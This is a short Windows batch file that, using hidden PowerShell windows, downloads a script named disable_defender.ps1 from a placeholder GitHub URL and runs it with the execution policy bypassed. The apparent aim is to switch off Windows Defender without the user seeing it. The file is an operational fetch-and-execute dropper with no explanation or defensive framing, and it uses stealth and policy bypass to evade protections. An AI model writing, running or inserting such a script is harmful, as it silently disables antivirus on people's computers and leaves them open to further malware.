@echo off
powershell -windowstyle hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/username/repository/main/disable_defender.ps1' -OutFile 'disable_defender.ps1'"
powershell -windowstyle hidden -ExecutionPolicy Bypass -File "disable_defender.ps1"
